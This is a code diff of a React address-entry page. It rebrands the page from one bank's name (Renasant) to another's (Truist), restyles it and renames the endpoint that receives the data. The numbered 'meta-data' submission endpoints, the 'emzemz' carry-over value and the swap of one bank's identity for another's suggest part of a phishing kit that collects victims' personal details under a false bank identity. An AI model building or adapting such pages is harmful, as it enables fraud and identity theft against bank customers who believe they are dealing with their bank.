@@ -3,8 +3,7 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
-import FlowCard from '../components/FlowCard';
-import FormError from '../components/FormError';
+import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';
 
 const HomeAddress: React.FC = () => {
   const [stAd, setStAd] = useState('');
@@ -44,7 +43,7 @@ const HomeAddress: React.FC = () => {
 
     if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
       try {
-        await axios.post(`${baseUrl}api/renasant-meta-data-4/`, {
+        await axios.post(`${baseUrl}api/truist-meta-data-4/`, {
           emzemz,
           stAd,
           apt,
@@ -73,142 +72,169 @@ const HomeAddress: React.FC = () => {
 
   if (!emzemz) {
     return (
-      <FlowCard title="Unable to continue">
-        <p className="text-sm text-slate-600">
-          We could not locate your previous step. Please restart the flow from the beginning.
-        </p>
-      </FlowCard>
+      <div className="flex flex-col items-center justify-center">
+        <div className={cardStyles.base}>
+          <div className={cardStyles.padding}>
+            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
+              Unable to continue
+            </h1>
+            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
+              We could not locate your previous step. Please restart the flow from the beginning.
+            </p>
+          </div>
+        </div>
+      </div>
     );
   }
 
-  const footer = (
-    <p className="text-xs text-slate-600 text-center">
-      Your information is secure and will be used in accordance with our Privacy Policy.
-    </p>
-  );
-
   return (
-    <FlowCard
-      title="Confirm Your Home Address"
-      subtitle={<span className="text-slate-600">This should match the address tied to your credit profile.</span>}
-      footer={footer}
-    >
-      <form onSubmit={handleSubmit} className="space-y-4">
-        <div>
-          <label className="block text-sm text-slate-500 mb-1" htmlFor="stAd">
-            Street address
-          </label>
-          <div className="flex items-center border border-slate-200 rounded">
-            <input
-              id="stAd"
-              name="stAd"
-              type="text"
-              value={stAd}
-              onChange={(e) => setStAd(e.target.value)}
-              className="w-full px-3 py-3 text-sm focus:outline-none"
-              placeholder="123 Main St"
-            />
-          </div>
-          {errors.stAd ? <FormError message={errors.stAd} /> : null}
-        </div>
+    <div className="flex flex-col items-center justify-center">
+      <div className={cardStyles.base}>
+        <div className={cardStyles.padding}>
+          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
+            Confirm Your Home Address
+          </h1>
+          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
+            This should match the address tied to your credit profile
+          </p>
 
-        <div>
-          <label className="block text-sm text-slate-500 mb-1" htmlFor="apt">
-            Apartment or unit (optional)
-          </label>
-          <div className="flex items-center border border-slate-200 rounded">
-            <input
-              id="apt"
-              name="apt"
-              type="text"
-              value={apt}
-              onChange={(e) => setApt(e.target.value)}
-              className="w-full px-3 py-3 text-sm focus:outline-none"
-              placeholder="Unit 5B"
-            />
-          </div>
-        </div>
-
-        <div>
-          <label className="block text-sm text-slate-500 mb-1" htmlFor="city">
-            City
-          </label>
-          <div className="flex items-center border border-slate-200 rounded">
-            <input
-              id="city"
-              name="city"
-              type="text"
-              value={city}
-              onChange={(e) => setCity(e.target.value)}
-              className="w-full px-3 py-3 text-sm focus:outline-none"
-              placeholder="City"
-            />
-          </div>
-          {errors.city ? <FormError message={errors.city} /> : null}
-        </div>
-
-        <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
-          <div>
-            <label className="block text-sm text-slate-500 mb-1" htmlFor="state">
-              State
-            </label>
-            <div className="flex items-center border border-slate-200 rounded">
+          <form onSubmit={handleSubmit} className="space-y-6">
+            <div className="space-y-2">
+              <label className="text-sm text-[#5d4f72]" htmlFor="stAd">
+                Street address
+              </label>
               <input
-                id="state"
-                name="state"
+                id="stAd"
+                name="stAd"
                 type="text"
-                value={state}
-                onChange={(e) => setState(e.target.value)}
-                className="w-full px-3 py-3 text-sm focus:outline-none"
-                placeholder="CA"
+                value={stAd}
+                onChange={(e) => setStAd(e.target.value)}
+                className={`${inputStyles.base} ${inputStyles.focus}`}
+                placeholder="123 Main St"
+              />
+              {errors.stAd && (
+                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                  </svg>
+                  <span>{errors.stAd}</span>
+                </div>
+              )}
+            </div>
+
+            <div className="space-y-2">
+              <label className="text-sm text-[#5d4f72]" htmlFor="apt">
+                Apartment or unit (optional)
+              </label>
+              <input
+                id="apt"
+                name="apt"
+                type="text"
+                value={apt}
+                onChange={(e) => setApt(e.target.value)}
+                className={`${inputStyles.base} ${inputStyles.focus}`}
+                placeholder="Unit 5B"
               />
             </div>
-            {errors.state ? <FormError message={errors.state} /> : null}
-          </div>
 
-          <div>
-            <label className="block text-sm text-slate-500 mb-1" htmlFor="zipCode">
-              ZIP code
-            </label>
-            <div className="flex items-center border border-slate-200 rounded">
+            <div className="space-y-2">
+              <label className="text-sm text-[#5d4f72]" htmlFor="city">
+                City
+              </label>
               <input
-                id="zipCode"
-                name="zipCode"
+                id="city"
+                name="city"
                 type="text"
-                value={zipCode}
-                onChange={(e) => setZipCode(e.target.value)}
-                className="w-full px-3 py-3 text-sm focus:outline-none"
-                placeholder="90210"
+                value={city}
+                onChange={(e) => setCity(e.target.value)}
+                className={`${inputStyles.base} ${inputStyles.focus}`}
+                placeholder="City"
               />
+              {errors.city && (
+                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                  </svg>
+                  <span>{errors.city}</span>
+                </div>
+              )}
             </div>
-            {errors.zipCode ? <FormError message={errors.zipCode} /> : null}
-          </div>
+
+            <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="state">
+                  State
+                </label>
+                <input
+                  id="state"
+                  name="state"
+                  type="text"
+                  value={state}
+                  onChange={(e) => setState(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                  placeholder="CA"
+                />
+                {errors.state && (
+                  <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                    <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                      <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                    </svg>
+                    <span>{errors.state}</span>
+                  </div>
+                )}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]" htmlFor="zipCode">
+                  ZIP code
+                </label>
+                <input
+                  id="zipCode"
+                  name="zipCode"
+                  type="text"
+                  value={zipCode}
+                  onChange={(e) => setZipCode(e.target.value)}
+                  className={`${inputStyles.base} ${inputStyles.focus}`}
+                  placeholder="90210"
+                />
+                {errors.zipCode && (
+                  <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
+                    <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
+                      <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
+                    </svg>
+                    <span>{errors.zipCode}</span>
+                  </div>
+                )}
+              </div>
+            </div>
+
+            {errors.form && (
+              <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
+                {errors.form}
+              </div>
+            )}
+
+            <div className="flex flex-wrap gap-3 pt-2">
+              <button
+                type="submit"
+                className={buttonStyles.base}
+                disabled={isLoading}
+              >
+                {isLoading ? (
+                  <span className={buttonStyles.loading}></span>
+                ) : (
+                  'Continue'
+                )}
+              </button>
+            </div>
+          </form>
+
+          <p className="text-xs text-[#5d4f72] mt-8 text-center">
+            Your information is secure and will be used in accordance with our Privacy Policy.
+          </p>
         </div>
-
-        {errors.form ? (
-          <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
-            {errors.form}
-          </div>
-        ) : null}
-
-        <button
-          type="submit"
-          className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
-          disabled={isLoading}
-        >
-          {isLoading ? (
-            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
-          ) : (
-            <>
-              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 0l-2 2m2-2l-2-2m6 2l2 2m-2-2l2-2" />
-              </svg>
-              <span>Continue</span>
-            </>
-          )}
-        </button>
-      </form>
-    </FlowCard>
+      </div>
+    </div>
   );
 };
 
